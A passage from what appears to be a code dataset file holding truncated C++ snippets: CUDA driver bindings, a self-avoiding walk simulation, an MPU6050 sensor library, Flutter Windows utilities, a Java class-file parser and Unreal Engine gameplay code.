cuLinkAddFile)\n\t\t\tGET_ADDRESS(PFN_cuLinkComplete, cuLinkComplete)\n\t\t\tGET_ADDRESS(PFN_cuLinkDestroy, cuLinkDestroy)\n\t\t\tGET_ADDRESS(PFN_cuMemGetInfo, cuMemGetInfo)\n\t\t\tGET_ADDRESS(PFN_cuMemAlloc, cuMemAlloc)\n\t\t\tGET_ADDRESS(PFN_cuMemAllocPitch, cuMemAllocPitch)\n\t\t\tGET_ADDRESS(PFN_cuMemFree, cuMemFree)\n\t\t\tGET_ADDRESS(PFN_cuMemGetAddressRange, cuMemGetAddressRange)\n\t\t\tGET_ADDRESS(PFN_cuMemAllocHost, cuMemAllocHost)\n\t\t\tGET_ADDRESS(PFN_cuMemFreeHost, cuMemFreeHost)\n\t\t\tGET_ADDRESS(PFN_cuMemHostAlloc, cuMemHostAlloc)\n\t\t\tGET_ADDRESS(PFN_cuMemHostGetDevicePointer, cuMemHostGetDevicePointer)\n\t\t\tGET_ADDRESS(PFN_cuMemHostGetFlags, cuMemHostGetFlags)\n\t\t\tGET_ADDRESS(PFN_cuMemAllocManaged, cuMemAllocManaged)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetByPCIBusId, cuDeviceGetByPCIBusId)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetPCIBusId, cuDeviceGetP",
    "#include <iostream>\n#include <cstdlib>\n#include <vector>\n#include <set>\n#include <bits/stdc++.h>\n#include <array>\n#include <cmath>\n#include <algorithm>\n#include <random>\nusing namespace std;\n\n/*\nTakes input variables \n* n : maximum number of iterations before the algorithm stops\n* desired_length : the desired length of the SAW\n* x : fugacity term should be set between 0 and 1\n* d : dimension of walk\n* z : coordination number should be set to 2d\n* save : 1 to store the walk, 0 to avoid this step\n\n*/\n\n\n\ndouble eucl_dist(vector<int> final_pos)\n{\n    return sqrt(final_pos[0]*final_pos[0]+final_pos[1]*final_pos[1]);\n}\ndouble eucl_dist3D(vector<int> final_pos)\n{\n    return sqrt(final_pos[0]*final_pos[0]+final_pos[1]*final_pos[1]+final_pos[2]*final_pos[2]);\n}\ndouble Pplus(double x, double z)\n{\n    //Acceptance probability for positive move\n    return min(1.0,z*x/(1.0+x*z));\n}\nint delta_func(int xy, int xpyp)\n{\n    if (xy==xpyp)\n    {\n        return 1;\n    }\n    else\n    {\n        return 0;\n    }\n}\ndouble localField(int direction_minus_1,int direction_current)\n{\n    //Local Field will return number of curves at the point\n    return 1 - 2*double(delta_func(direction_current,direction_minus_1));\n}\ndouble Pneg(double x, double z)\n{\n    //Acceptance probability for negative move\n    return min(1.0,1.0/(1.0+x*z));\n}\n\nvoid SaveWalk(vector<vector<int>> coordinates)\n{\n    ofstream file;\n\n    //naming file to store results in\n    file.open(\"TwoStepBSSAW2DWeighted.csv\");\n    for (int i = 0; i < coordinates.size(); i++) \n    { \n        for ( \n            auto it = coordinates[i].begin(); \n            it != coordinates[i].end(); it++) \n            file << *it << \",\"; \n        file << endl; \n    } \n    file.close();\n}\n\nvector<double> TwoMoveBerrettiSokal(double x, double z, double d, int n, int desired_length,  int save)\n{\n    /*\n    x fugacity \n    z = 2*d\n    d dimension \n    n max number of iterations \n    desired_length required length of walk \n    save 1/0, save the walk to csv file/not\n    */\n\n\n    vector<int> row(d);\n    vector<int> temp_row(d);\n    \n    //make coordinates vector the length of n and cut off where necessary at the end\n    //maximum length of coordinates is n \n    double dS;\n    vector<vector<int>> coordinates;\n    coordinates.push_back(row);\n    set<vector<int>> checker;\n\n    //update the length and append set at the same time\n    //if values are the same, new coord is valid \n    int length {1};\n    double e2e{0};\n    checker.insert(row);\n\n    //initialise a vector to store all directions and store the current SAW checker set\n    //Make it of length n, this is the maximum length that could be needed\n    \n    vector<int> prev_directions;\n    int prev_dir;\n    \n    //Random number generator for getting the direction \n    default_random_engine generator(random_device{}());\n    uniform_int_distribution<int> direction(1,2*d);\n    uniform_real_distribution<double> percent(0,1);\n\n    \n\n    //second random number generator to determine which move to make\n    //uniform_int_distribution<int> atmosphere_choice(1,2);\n    vector <int> length_per_step;\n    int move {0};\n    int step {0};\n    double acc {0};\n    double r {0};\n    int random_number, removal;\n    double index {0};\n    bool zeros = std::all_of(row.begin(), row.end(), [](int i) { return i==0; });\n    int break_point{0};\n    while (length < desired_length)\n    {\n        break_point+=1;\n        if (break_point == n)\n        {\n            break;\n        }\n        //First move is positive move unbounded to any direction\n        //std::cout << \"\\n\";\n        //std::cout <<\"Before Move Row: \"<< row[0] << \" \" << row[1] << \"\\n\"; \n\n        zeros = std::all_of(row.begin(), row.end(), [](int i) { return i==0; });\n        if (zeros == true)\n        {\n            //std::cout << \"At Origin \\n\";\n            //check to see if the move should be accepted\n            \n            \n            step = direction(generator);\n            //std::cout << \"Step in: \"<< step <<\" Directions \\n\";\n            prev_directions.push_back(step);    \n            if (step%2 == 0)\n            {\n                index = (step/2) -1;\n                //make step\n                row[index] = row[index] - 1;\n                temp_row[index] = temp_row[index] - 1;\n            }\n            else if (step%2 !=0)\n            {   \n                step += 1;\n                index = (step/2) -1;\n                //make step\n                row[index] = row[index] + 1;\n                temp_row[index] = temp_row[index] + 1;\n            }\n            coordinates.push_back(row);\n            checker.insert(row);\n            length += 1;\n            length_per_step.push_back(length);\n        }\n\n        else \n        {\n            //If move is 1 > positive move to be made\n            //If move = 2 > negative move\n            acc = Pplus(x,z);\n            if (acc < 1)\n            {\n                r = percent(generator);\n                \n                if (r > acc)\n                {\n                    //std::cout <",
    "// I2Cdev library collection - MPU6050 I2C device class\n// Based on InvenSense MPU-6050 register map document rev. 2.0, 5/19/2011 (RM-MPU-6000A-00)\n// 8/24/2011 by Jeff Rowberg <jeff@rowberg.net>\n// Updates should (hopefully) always be available at https://github.com/jrowberg/i2cdevlib\n//\n// Changelog:\n//  2019-07-08 - Added Auto Calibration routine\n//     ... - ongoing debug release\n\n// NOTE: THIS IS ONLY A PARIAL RELEASE. THIS DEVICE CLASS IS CURRENTLY UNDERGOING ACTIVE\n// DEVELOPMENT AND IS STILL MISSING SOME IMPORTANT FEATURES. PLEASE KEEP THIS IN MIND IF\n// YOU DECIDE TO USE THIS PARTICULAR CODE FOR ANYTHING.\n\n/* ============================================\nI2Cdev device library code is placed under the MIT license\nCopyright (c) 2012 Jeff Rowberg\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\nTHE SOFTWARE.\n===============================================\n*/\n\n#include \"MPU6050.h\"\n\n/** Specific address constructor.\n * @param address I2C address, uses default I2C address if none is specified\n * @see MPU6050_DEFAULT_ADDRESS\n * @see MPU6050_ADDRESS_AD0_LOW\n * @see MPU6050_ADDRESS_AD0_HIGH\n */\nMPU6050::MPU6050(uint8_t address):devAddr(address) {\n}\n\n/** Power on and prepare for general usage.\n * This will activate the device and take it out of sleep mode (which must be done\n * after start-up). This function also sets both the accelerometer and the gyroscope\n * to their most sensitive settings, namely +/- 2g and +/- 250 degrees/sec, and sets\n * the clock source to use the X Gyro for reference, which is slightly better than\n * the default internal clock source.\n */\nvoid MPU6050::initialize() {\n    setClockSource(MPU6050_CLOCK_PLL_XGYRO);\n    setFullScaleGyroRange(MPU6050_GYRO_FS_250);\n    setFullScaleAccelRange(MPU6050_ACCEL_FS_2);\n    setSleepEnabled(false); // thanks to Jack Elston for pointing this one out!\n}\n\n/** Verify the I2C connection.\n * Make sure the device is connected and responds as expected.\n * @return True if connection is valid, false otherwise\n */\nbool MPU6050::testConnection() {\n    return getDeviceID() == 0x34;\n}\n\n// AUX_VDDIO register (InvenSense demo code calls this RA_*G_OFFS_TC)\n\n/** Get the auxiliary I2C supply voltage level.\n * When set to 1, the auxiliary I2C bus high logic level is VDD. When cleared to\n * 0, the auxiliary I2C bus high logic level is VLOGIC. This does not apply to\n * the MPU-6000, which does not have a VLOGIC pin.\n * @return I2C supply voltage level (0=VLOGIC, 1=VDD)\n */\nuint8_t MPU6050::getAuxVDDIOLevel() {\n    I2Cdev::readBit(devAddr, MPU6050_RA_YG_OFFS_TC, MPU6050_TC_PWR_MODE_BIT, buffer);\n    return buffer[0];\n}\n/** Set the auxiliary I2C supply voltage level.\n * When set to 1, the auxiliary I2C bus high logic level is VDD. When cleared to\n * 0, the auxiliary I2C bus high logic level is VLOGIC. This does not apply to\n * the MPU-6000, which does not have a VLOGIC pin.\n * @param level I2C supply voltage level (0=VLOGIC, 1=VDD)\n */\nvoid MPU6050::setAuxVDDIOLevel(uint8_t level) {\n    I2Cdev::writeBit(devAddr, MPU6050_RA_YG_OFFS_TC, MPU6050_TC_PWR_MODE_BIT, level);\n}\n\n// SMPLRT_DIV register\n\n/** Get gyroscope output rate divider.\n * The sensor register output, FIFO output, DMP sampling, Motion detection, Zero\n * Motion detection, and Free Fall detection are all based on the Sample Rate.\n * The Sample Rate is generated by dividing the gyroscope output rate by\n * SMPLRT_DIV:\n *\n * Sample Rate = Gyroscope Output Rate / (1 + SMPLRT_DIV)\n *\n * where Gyroscope Output Rate = 8kHz when the DLPF is disabled (DLPF_CFG = 0 or\n * 7), and 1kHz when the DLPF is enabled (see Register 26).\n *\n * Note: The accelerometer output rate is 1kHz. This means that for a Sample\n * Rate greater than 1kHz, the same accelerometer sample may be output to the\n * FIFO, DMP, and sensor registers more than once.\n *\n * For a diagram of the gyroscope and accelerometer signal paths, see Section 8\n * of the MPU-6000/MPU-6050 Product Specification document.\n *\n * @return Current sample rate\n * @see MPU6050_RA_SMPLRT_DIV\n */\nuint8_t MPU6050::getRate() {\n    I2Cdev::r",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"../include/ClassFileParser.hpp\"\n\nClassFileParser::ClassFileParser(ClassFile* cf) : cf(cf) {\n\tcf->magic_dword   = cf->stream.get_u4();\n\tcf->minor_version = cf->stream.get_u2();\n\tcf->major_version = cf->stream.get_u2();\n\n\tparse_constant_pool();\n\n\tcf->access_flags = cf->stream.get_u2();\n\tcf->this_class   = cf->stream.get_u2();\n\tcf->super_class  = cf->stream.get_u2();\n\n\tparse_interfaces();\n\tparse_fields();\n\tparse_methods();\n\tparse_attributes();\n}\n\nvoid ClassFileParser::parse_constant_pool() {\n\tcf->cp_info.entries_count = cf->stream.get_u2();\n\n\tfor (u2 index = 1; index < cf->cp_info.entries_count; index++) {\n\t\tConstantPoolEntry entry;\n\t\tentry.tag = cf->stream.get_u1();\n\t\t\n\t\tswitch (entry.tag) {\n\t\t\tcase CONSTANT_Class:\n\t\t\tcase CONSTANT_Module:\n\t\t\tcase CONSTANT_Package: {\n\t\t\t\tentry.info = std::shared_ptr<u1[]>(new u1[sizeof(NameIndexEntryInfo)]);\n\t\t\t\tNameIndexEntryInfo* entry_info = (NameIndexEntryInfo*)entry.info.get();\n\n\t\t\t\tentry_info->name_index = cf->stream.get_u2();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase CONSTANT_Fieldref:\n\t\t\tcase CONSTANT_Methodref:\n\t\t\tcase CONSTANT_InterfaceMethodref: {\n\t\t\t\tentry.info = std::shared_ptr<u1[]>(new u1[sizeof(RefEntryInfo)]);\n\t\t\t\tRefEntryInfo* entry_info = (RefEntryInfo*)entry.info.get();\n\n\t\t\t\tentry_info->class_index         = cf->stream.get_u2();\n\t\t\t\tentry_info->name_and_type_index = cf->stream.get_u2();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase CONSTANT_String: {\n\t\t\t\tentry.info = std::shared_ptr<u1[]>(new u1[sizeof(StringEntryInfo)]);\n\t\t\t\tStringEntryInfo* entry_info = (StringEntryInfo*)entry.info.get();\n\n\t\t\t\tentry_info->string_index = cf->stream.get_u2();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase CONSTANT_Integer: {\n\t\t\t\tentry.info = std::shared_ptr<u1[]>(new u1[sizeof(IntegerEntryInfo)]);\n\t\t\t\tIntegerEntryInfo* entry_info = (IntegerEntryInfo*)entry.info.get();\n\n\t\t\t\tentry_info->value = cf->stream.get_u4();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase CONSTANT_Float: {\n\t\t\t\tentry.info = std::shared_ptr<u1[]>(new u1[sizeof(FloatEntryInfo)]);\n\t\t\t\tFloatEntryInfo* entry_info = (FloatEntryInfo*)entry.info.get();\n\n\t\t\t\tu4 bytes = cf->stream.get_u4();\n\t\t\t\tentry_info->value = *(float*)&bytes;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase CONSTANT_Long: {\n\t\t\t\tentry.info = std::shared_ptr<u1[]>(new u1[sizeof(LongEntryInfo)]);\n\t\t\t\tLongEntryInfo* entry_info = (LongEntryInfo*)entry.info.get();\n\n\t\t\t\tentry_info->value = cf->stream.get_u8();\n\t\t\t\tindex++;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase CONSTANT_Double: {\n\t\t\t\tentry.info = std::shared_ptr<u1[]>(new u1[sizeof(DoubleEntryInfo)]);\n\t\t\t\tDoubleEntryInfo* entry_info = (DoubleEntryInfo*)entry.info.get();\n\n\t\t\t\tu4 high_bytes = cf->stream.get_u4();\n\t\t\t\tu4 low_bytes  = cf->stream.get_u4();\n\n\t\t\t\t*reinterpret_cast<u4*>(&entry_info->value) = low_bytes;\n\t\t\t\t*(reinterpret_cast<u4*>(&entry_info->value) + 1) = high_bytes;\n\n\t\t\t\tindex++;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase CONSTANT_NameAndType: {\n\t\t\t\tentry.info = std::shared_ptr<u1[]>(new u1[sizeof(NameAndTypeEntryInfo)]);\n\t\t\t\tNameAndTypeEntryInfo* entry_info = (NameAndTypeEntryInfo*)entry.info.get();\n\n\t\t\t\tentry_info->name_index       = cf->stream.get_u2();\n\t\t\t\tentry_info->descriptor_index = cf->stream.get_u2();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase CONSTANT_MethodHandle: {\n\t\t\t\tentry.info = std::shared_ptr<u1[]>(new u1[sizeof(MethodHandleEntryInfo)]);\n\t\t\t\tMethodHandleEntryInfo* entry_info = (MethodHandleEntryInfo*)entry.info.get();\n\n\t\t\t\tentry_info->reference_kind  = cf->stream.get_u1();\n\t\t\t\tentry_info->reference_index = cf->stream.get_u2();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase CONSTANT_MethodType: {\n\t\t\t\tentry.info = std::shared_ptr<u1[]>(new u1[sizeof(MethodTypeEntryInfo)]);\n\t\t\t\tMethodTypeEntryInfo* entry_info = (MethodTypeEntryInfo*)entry.info.get();\n\n\t\t\t\tentry_info->descriptor_index = cf->stream.get_u2();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase CONSTANT_Dynamic:\n\t\t\tcase CONSTANT_InvokeDynamic: {\n\t\t\t\tentry.info = std::shared_ptr<u1[]>(new u1[sizeof(DynamicEntryInfo)]);\n\t\t\t\tDynamicEntryInfo* entry_info = (DynamicEntryInfo*)entry.info.get();\n\n\t\t\t\tentry_info->bootstrap_method_attr_index = cf->stream.get_u2();\n\t\t\t\tentry_info->name_and_type_index         = cf->stream.get_u2();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase CONSTANT_Utf8: {\n\t\t\t\tu2 length = cf->stream.get_u2();\n\n\t\t\t\tentry.info = std::shared_ptr<u1[]>(new u1[2 + length]);\n\t\t\t\tUtf8EntryInfo* entry_info = (Utf8EntryInfo*)entry.info.get();\n\n\t\t\t\tentry_info->length = length;\n\t\t\t\tstd::memcpy(&entry_info->str, cf->stream.current, length);\n\t\t\t\tcf->stream.current += length;\n\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tdefault: {\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\n\t\tcf->cp_info.entries.push_back(entry);\n\n\t\tif (entry.tag == CONSTANT_Long || entry.tag == CONSTANT_Double)\n\t\t\tcf->cp_info.entries.push_back(ConstantPoolEntry());\n\t}\n\n\tcf->cp_info.attribute_indexes.code = cf->cp_info.find_entry(CONSTANT_Utf8, \"Code\");\n\tcf->cp_info.attribute_indexes.line_number_table = cf->cp_info.find_entry(CONSTANT_Utf8, \"LineNumberTable\");\n}\n\nvoid ClassFileParser::parse_interfaces() {\n\tcf->interfaces_count = cf->stream.get_u2();\n\tcf->interfaces       = std::shared_ptr<u2[]>(new u2[cf->interfaces_count]);\n\n\tstd::memcpy(cf->interfaces.get(), cf->stream.current, cf->interfaces_count * sizeof(u2));\n",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n/*===========================================================================\n\tGenerated code exported from UnrealHeaderTool.\n\tDO NOT modify this manually! Edit the corresponding .h files instead!\n===========================================================================*/\n\n#include \"UObject/GeneratedCppIncludes.h\"\n#include \"ManagerUI/Public/LayerManagerHUD.h\"\nPRAGMA_DISABLE_DEPRECATION_WARNINGS\nvoid EmptyLinkFunctionForGeneratedCodeLayerManagerHUD() {}\n// Cross Module References\n\tENGINE_API UClass* Z_Construct_UClass_AHUD();\n\tMANAGERUI_API UClass* Z_Construct_UClass_ALayerManagerHUD();\n\tMANAGERUI_API UClass* Z_Construct_UClass_ALayerManagerHUD_NoRegister();\n\tMANAGERUI_API UClass* Z_Construct_UClass_ULayerUI_NoRegister();\n\tUMG_API UClass* Z_Construct_UClass_UUserWidget_NoRegister();\n\tUPackage* Z_Construct_UPackage__Script_ManagerUI();\n// End Cross Module References\n\tDEFINE_FUNCTION(ALayerManagerHUD::execIsWidgetOnTopOfLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_GET_OBJECT(UUserWidget,Z_Param_Widget);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\t*(bool*)Z_Param__Result=P_THIS->IsWidgetOnTopOfLayer(Z_Param_Name,Z_Param_Widget);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execPeekLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\t*(UUserWidget**)Z_Param__Result=P_THIS->PeekLayer(Z_Param_Name);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execGetCurrentLayerTag)\n\t{\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\t*(FString*)Z_Param__Result=P_THIS->GetCurrentLayerTag();\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execGetLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\t*(ULayerUI**)Z_Param__Result=P_THIS->GetLayer(Z_Param_Name);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execClearLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->ClearLayer(Z_Param_Name);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execClearAllLayers)\n\t{\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->ClearAllLayers();\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execPopFromCurrentLayer)\n\t{\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\t*(UUserWidget**)Z_Param__Result=P_THIS->PopFromCurrentLayer();\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execPopFromLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\t*(UUserWidget**)Z_Param__Result=P_THIS->PopFromLayer(Z_Param_Name);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execPushToLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_GET_OBJECT(UUserWidget,Z_Param_Widget);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->PushToLayer(Z_Param_Name,Z_Param_Widget);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execRemoveLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->RemoveLayer(Z_Param_Name);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execRegisterLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_GET_OBJECT(ULayerUI,Z_Param_Layer);\n\t\tP_GET_UBOOL(Z_Param_bCurrent);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->RegisterLayer(Z_Param_Name,Z_Param_Layer,Z_Param_bCurrent);\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(ALayerManagerHUD::execRegisterDefaultLayer)\n\t{\n\t\tP_GET_PROPERTY(FStrProperty,Z_Param_Name);\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->RegisterDefaultLayer(Z_Param_Name);\n\t\tP_NATIVE_END;\n\t}\n\tvoid ALayerManagerHUD::StaticRegisterNativesALayerManagerHUD()\n\t{\n\t\tUClass* Class = ALayerManagerHUD::StaticClass();\n\t\tstatic const FNameNativePtrPair Funcs[] = {\n\t\t\t{ \"ClearAllLayers\", &ALayerManagerHUD::execClearAllLayers },\n\t\t\t{ \"ClearLayer\", &ALayerManagerHUD::execClearLayer },\n\t\t\t{ \"GetCurrentLayerTag\", &ALayerManagerHUD::execGetCurrentLayerTag },\n\t\t\t{ \"GetLayer\", &ALayerManagerHUD::execGetLayer },\n\t\t\t{ \"IsWidgetOnTopOfLayer\", &ALayerManagerHUD::execIsWidgetOnTopOfLayer },\n\t\t\t{ \"PeekLayer\", &ALayerManagerHUD::execPeekLayer },\n\t\t\t{ \"PopFromCurrentLayer\", &ALayerManagerHUD::execPopFromCurrentLayer },\n\t\t\t{ \"PopFromLayer\", &ALayerManagerHUD::execPopFromLayer },\n\t\t\t{ \"PushToLayer\", &ALayerManagerHUD::execPushToLayer },\n\t\t\t{ \"RegisterDefaultLayer\", &ALayerManagerHUD::execRegisterDefaultLayer },\n\t\t\t{ \"RegisterLayer\", &ALayerManagerHUD::execRegisterLayer },\n\t\t\t{ \"RemoveLayer\", &ALayerManagerHUD::execRemoveLayer },\n\t\t};\n\t\tFNativeFunctionRegistrar::RegisterFunctions(Class, Funcs, UE_ARRAY_COUNT(Funcs));\n\t}\n\tstruct Z_Construct_UFunction_ALayerManagerHUD_ClearAllLayers_Statics\n\t{\n#if WITH_METADATA\n\t\tstatic const UECodeGen_Private::FMetaDataPairParam Function_MetaDataParams[];\n#endif\n\t\tstatic const UECodeGen_Private::FFunctionParams FuncParams;\n\t};\n#if WITH_METADATA\n\tconst UECodeGen_Private::FMetaDataPairParam Z_Construct_UFunction_ALayerManagerHUD_ClearAllLayers_Statics::Function_MetaDataParams[] = {\n\t\t{ \"Category\", \"Layer\" },\n\t\t{ \"Comment\", \"/** Clears all layers. */\" },\n\t\t{ \"ModuleRelativePath\", \"Public/LayerManagerHUD.h\" }",
    "// Copyright INVI1998\n\n\n#include \"AbilitySystem/AuraAttributeSet.h\"\n\n#include \"AbilitySystemBlueprintLibrary.h\"\n#include \"AuraGameplayTags.h\"\n#include \"GameFramework/Character.h\"\n#include \"GameplayEffectExtension.h\"\n#include \"AbilitySystem/AuraAbilitySystemLibrary.h\"\n#include \"Components/CapsuleComponent.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"Interaction/CombatInterface.h\"\n#include \"Interaction/PlayerInterface.h\"\n#include \"Kismet/GameplayStatics.h\"\n\n#include \"Net/UnrealNetwork.h\"\n#include \"Player/AuraPlayerController.h\"\n#include \"Player/AuraPlayerState.h\"\n\nUAuraAttributeSet::UAuraAttributeSet()\n{\n\t// const FAuraGameplayTags& GameplayTags = FAuraGameplayTags::Get();\t// \u83b7\u53d6\u6807\u7b7e\n\n\t///* Primary Attributes */\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Primary_Strength, GetStrengthAttribute);\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Primary_Intelligence, GetIntelligenceAttribute);\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Primary_Resilience, GetResilienceAttribute);\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Primary_Vigor, GetVigorAttribute);\n\n\t///* Secondary Attributes */\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Secondary_Armor, GetArmorAttribute);\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Secondary_ArmorPenetration, GetArmorPenetrationAttribute);\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Secondary_BlockChance, GetBlockChanceAttribute);\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Secondary_CriticalHitChance, GetCriticalHitChanceAttribute);\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Secondary_CriticalHitResistance, GetCriticalHitResistanceAttribute);\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Secondary_CriticalHitDamage, GetCriticalHitDamageAttribute);\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Secondary_HealthRegeneration, GetHealthRegenerationAttribute);\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Secondary_ManaRegeneration, GetManaRegenerationAttribute);\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Secondary_MaxHealth, GetMaxHealthAttribute);\n\t//TagsToAttributes.Add(GameplayTags.Attributes_Secondary_MaxMana, GetMaxManaAttribute);\n}\n\nvoid UAuraAttributeSet::PreAttributeChange(const FGameplayAttribute& Attribute, float& NewValue)\n{\n\tSuper::PreAttributeChange(Attribute, NewValue);\n\n\t// \u9650\u5236\u751f\u547d\u503c\u548c\u6700\u5927\u751f\u547d\u503c\u7684\u8303\u56f4\n\tif (Attribute == GetHealthAttribute())\n\t{\n\t\tNewValue = FMath::Clamp(NewValue, 0.f, GetMaxHealth());\n\t}\n\telse if (Attribute == GetMaxHealthAttribute())\n\t{\n\t\tNewValue = FMath::Max(NewValue, 0.f);\n\t}\n\telse if (Attribute == GetManaAttribute())\n\t{\n\t\tNewValue = FMath::Clamp(NewValue, 0.f, GetMaxMana());\n\t}\n\telse if (Attribute == GetMaxManaAttribute())\n\t{\n\t\tNewValue = FMath::Max(NewValue, 0.f);\n\t}\n}\n\nvoid UAuraAttributeSet::PostGameplayEffectExecute(const FGameplayEffectModCallbackData& Data)\n{\n\tSuper::PostGameplayEffectExecute(Data);\n\n\tFEffectProperties EffectProperties;\n\tSetEffectsProperties(Data, EffectProperties);\t// \u8bbe\u7f6e\u6548\u679c\u5c5e\u6027\n\n\t// Clamp\n\tif 